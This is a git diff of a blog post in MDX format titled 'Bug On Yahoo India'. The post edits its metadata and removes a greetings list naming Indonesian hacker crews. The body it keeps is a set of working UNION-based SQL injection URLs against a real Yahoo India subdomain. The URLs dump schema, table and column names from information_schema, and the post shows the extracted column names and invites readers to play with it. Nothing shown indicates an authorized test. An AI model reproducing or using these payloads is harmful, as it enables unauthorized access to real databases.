@@ -1,12 +1,12 @@
 ---
 title: Bug On Yahoo India
-summary: ""
+summary: "SQL injection on site jagran.yahoo.com"
 publishedAt: '2009/11/12'
 category: 'SQL Injection'
-type: 'Bug'
+type: 'Pentest'
 banner:
   name: 'bug-on-yahoo-india'
-  caption: 'Lexical integrates perfectly with React to build complex editor experiences.'
+  caption: 'SQL injection on site jagran.yahoo.com'
 tags:
   [
     'Bug',
@@ -16,8 +16,6 @@ tags:
   ]
 
 ---
-
-import Screenshot from './yahoo-india.jpg';
 
 export * as banner from './yahoo-india.jpg';
 
@@ -31,9 +29,8 @@ export * as banner from './yahoo-india.jpg';
 [+] Date : Desember, 11-2009 [INDONESIA]
 *************************************************************************
 
-<LearningPathCard>
-  <ul>
-    <li>
+
+```bash
 [+]Priview : http://i45.tinypic.com/34i3a0j.jpg
 [+]http://in.jagran.yahoo.com/
 [+]http://in.jagran.yahoo.com/sahitya/article/index.php?category1&articleid=-2243
@@ -45,9 +42,7 @@ t(schema_name))),7,8,9,10,11,12,13,14+from+information_schema.schemata--
 t(table_name))),7,8,9,10,11,12,13,14+from+information_schema.tables+where+table_schema=0x444a--
 [+]http://in.jagran.yahoo.com/sahitya/article/index.php?category1&articleid=-2243+union+select+1,2,3,4,5,unhex(hex(group_conca
 t(column_name))),7,8,9,10,11,12,13,14+from+information_schema.columns+where+table_name=0x617274697374--
-    </li>
-  </ul>
-</LearningPathCard>
+```
 
 So, let's see the database right into it!
 
@@ -109,25 +104,6 @@ column name:
 column_name of artist :
 artist_name,birthdate,img_url,bio_article_id,artist_id
 ```
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Big Thanks => Yogyacarderlink & Indonesian Hacker
-Yogyacarderlink => v3n0m,leqhi,lingah,eidelweiss,IdioT_InsidE,Jali-,g0nz,aRiee,setanmuda,
-=> ghopar_santiago,komenk,^ones^,d4rk_kn19ht,yoga0400,m4rco,dewancc,bocah|dudul
-=> devilz_blue,jo8928,L4zyb0i,craxboy90,r1pp3r_m4y4,mywisdom
-========================================================================================================
-Indonesian Hacker => aa,bobyhikaru,byz,mogsawnewbie,oneal,gr33nc0d3,ELV1N4,vyc0d,penyoet,cs-31,N4ck0,MR.FRIBO
-=> th3_b4n7it,bom2stalker,dexter,james0baster,flyff666,kiddies,gonzhack,Ichito_Bandito
-========================================================================================================
-Others => g0par Santiago,Don Tukulesto,yadoy666
-=> badkiddies,broken_hack,M364TR0N
-=> zee_eichel,oche_aneh,v4lc0m87 & ALL MOSLEM HACKERS
-========================================================================================================
-Big Thanks => Bunda saya (karena saya nemuin bugs ini tepat di hari ibu)
-=> Ditha (kamu inspirasi terbesar ak)
-=> v3n0m (yang selalu sabar ngajarin gue dari awal sampe sekarang ini)
-=> aRiee (yang banyak ngajarin gw di jaringan walaupun gw kagak pernah ngerti wkwk)
-=> leQhi (yang bikin gw jadi semangat belajar)
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 Feel free to play with it. If you have questions or found a bug in the application, let me know on Twitter: <TwitterChip />
 
